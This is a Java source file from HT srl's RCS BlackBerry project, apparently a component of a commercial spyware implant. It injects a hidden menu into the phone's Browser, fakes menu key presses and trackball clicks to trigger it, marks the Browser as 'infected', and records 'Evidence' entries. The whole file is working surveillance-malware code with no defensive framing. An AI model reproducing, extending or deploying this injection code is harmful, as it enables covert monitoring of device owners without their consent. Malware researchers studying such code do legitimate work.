//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	

package blackberry.agent.url;

import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.ui.Keypad;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.injection.AppInjectorInterface;
import blackberry.injection.KeyInjector;
import blackberry.interfaces.Singleton;
import blackberry.utils.Utils;

public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
    //#ifdef DEBUG
    private static Debug debug = new Debug("AppInjBrowser", DebugLevel.VERBOSE);
    //#endif

    BrowserMenuItem menu = BrowserMenuItem.getInstance();

    private static AppInjectorBrowser instance;
    private static final long GUID = 0xa2b7338e410f087bL;
    private static final int DELAY = 5000;
    private static final int MAX_TRIES = 6;

    private int tries =0;
    private int delay = 100;
    boolean infected;

    public static synchronized AppInjectorBrowser getInstance() {
        if (instance == null) {
            instance = (AppInjectorBrowser) RuntimeStore.getRuntimeStore().get(
                    GUID);
            if (instance == null) {
                final AppInjectorBrowser singleton = new AppInjectorBrowser();

                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }
        }
        return instance;
    }

    private AppInjectorBrowser() {

    }

    public boolean injectMenu() {
        menu.addMenuBrowser();
        return true;
    }

    public boolean deleteMenu() {
        menu.removeMenuBrowser();
        return true;
    }

    public boolean callMenuByKey() {

        //#ifdef DEBUG
        debug.info("calling browser menu");
        //#endif
        
        tries++;
        if(tries >= MAX_TRIES){
            //#ifdef DEBUG
            debug.error("callMenuByKey: too many tries");
            //#endif
            if(tries == MAX_TRIES){
                Evidence.info("NO BBM");
            }
            return false;
        }

        KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
        Utils.sleep(delay + tries * 20);
        KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
        Utils.sleep(delay + tries * 20);
        KeyInjector.trackBallRawClick();

        return true;
    }

    public String getAppName() {
        return "Browser";
    }

    public void callMenuInContext() {
        menu.callMenuInContext();

    }

    public boolean isInfected() {
        return infected;
    }

    public void setInfected(boolean value) {
        if(value){
            Evidence.info("Browser");
        }
        infected = true;
    }

    public int getDelay() {
       
        return DELAY;
    }

    public void reset() {
        tries = 0;
    }

}
